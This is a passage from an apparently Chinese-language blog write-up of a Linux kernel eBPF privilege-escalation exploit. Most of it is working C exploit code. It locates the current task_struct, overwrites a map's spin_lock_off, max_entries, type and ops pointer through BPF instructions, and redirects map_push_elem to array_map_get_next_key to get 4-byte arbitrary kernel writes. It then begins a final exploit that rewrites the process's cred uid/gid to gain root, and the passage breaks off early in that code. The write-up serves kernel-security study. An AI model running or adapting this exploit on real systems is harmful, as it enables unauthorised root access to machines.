class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> current_task;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    current_task = next_task - <span class="hljs-number">0x818</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功获得当前进程的 <code>task_struct</code> 地址：</p><p><img src="https://s2.loli.net/2023/06/06/tVo6viTK8C53Y1F.png" alt="image.png"></p><h2 id="五、任意地址写"><a href="#五、任意地址写" class="headerlink" title="五、任意地址写"></a>五、任意地址写</h2><p>我们同时有 map 的地址和内核基址，同时还能直接改写 map 内部的内容，不难想到的是我们可以直接在 map 上构造 fake map ops 后劫持 map 函数表从而劫持内核控制流</p><p>比较传统的方式就是直接栈迁移然后 ROP 执行 <code>commit_cred(&amp;init_cred)</code>，但笔者看到一个非常有意思的构造任意写的思路，所以这里也用这种解法（笑）</p><p>注意到 array map 的 <code>map_get_next_key()</code> 定义如下，当 <code>key</code> 小于 <code>map.max_entries</code> 时 <code>key</code> 会被写入到 <code>next_key</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">array_map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *next_key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = key ? *(u32 *)key : U32_MAX;<br>u32 *next = (u32 *)next_key;<br><br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries) &#123;<br>*next = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (index == <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>*next = index + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然对于常规的调用 <code>map_get_next_key()</code> 的流程而言虽然 <code>key</code> 的内容是可控的但是 <code>next_key</code> 指针不是我们所能控制的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>next_key = kmalloc(<span class="hljs-built_in">map</span>-&gt;key_size, GFP_USER);<br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="hljs-built_in">map</span>, key, next_key);<br></code></pre></td></tr></table></figure><p>但是在 map ops 当中有一些函数可以让我们控制这两个参数，<strong>我们可以将这样的函数指针替换为</strong>  <code>map_get_next_key()</code> <strong>从而完成任意地址写</strong>，例如 <code>map_push_elem()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *value, u64 flags);<br></code></pre></td></tr></table></figure><p>当我们更新 eBPF map 时，若 map 类型为 <code>BPF_MAP_TYPE_QUEUE</code> 或 <code>BPF_MAP_TYPE_STACK</code> ，则这个函数会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_update_value</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> fd f, <span class="hljs-type">void</span> *key,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *value, __u64 flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||<br>   <span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="hljs-built_in">map</span>, value, flags);<br></code></pre></td></tr></table></figure><p>不过在我们调用 <code>bpf_map_update_value()</code> 时还有一个检查，若 flags 设置了 <code>BPF_F_LOCK</code> 标志位，则会检查 <code>map-&gt;spin_lock_off</code> 是否大于等于 0，若非则会直接报错返回，因此这里我们还要将该字段改为一个正整数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* flags for BPF_MAP_UPDATE_ELEM command */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>BPF_ANY= <span class="hljs-number">0</span>, <span class="hljs-comment">/* create new element or update existing */</span><br>BPF_NOEXIST= <span class="hljs-number">1</span>, <span class="hljs-comment">/* create new element if it didn&#x27;t exist */</span><br>BPF_EXIST= <span class="hljs-number">2</span>, <span class="hljs-comment">/* update existing element */</span><br>BPF_F_LOCK= <span class="hljs-number">4</span>, <span class="hljs-comment">/* spin_lock-ed map_lookup/map_update */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> map_value_has_spin_lock(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>-&gt;spin_lock_off &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_update_elem</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;<br>    !map_value_has_spin_lock(<span class="hljs-built_in">map</span>)) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> err_put;<br>&#125;<br><br><span class="hljs-comment">//...</span><br>err = bpf_map_update_value(<span class="hljs-built_in">map</span>, f, key, value, attr-&gt;flags);<br></code></pre></td></tr></table></figure><p>最后我们的任意写方案如下：我们可以在 <code>bpf_array.value</code> 上构造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key()</code> ，之后替换掉 map 的函数表，并更改 <code>map.max_entries</code> 为 <code>0xffffffff</code> 、更改 map 类型为  <code>BPF_MAP_TYPE_STACK</code> 、更改 <code>map.spin_lock_off</code> 为正数来实现任意地址写，需要注意的是<strong>单次只能写 4 字节</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>最后的 exp 如下，因为在 <code>array_map_get_next_key()</code> 中会检查 <code>index != max_entries - 1</code> ，而 <code>init_cred</code> 的高 32 位必定是 <code>0xFFFFFFFF</code> ，因此这里笔者选择直接改写当前进程的 <code>task_struct.cred</code> 的 uid 与 gid 相关字段：</p><blockquote><p>注：这里笔者将常用函数 &amp; 指令封装在了 <a href="/download/bpf_tools.h">bpf_tools.h</a> 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_tools.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 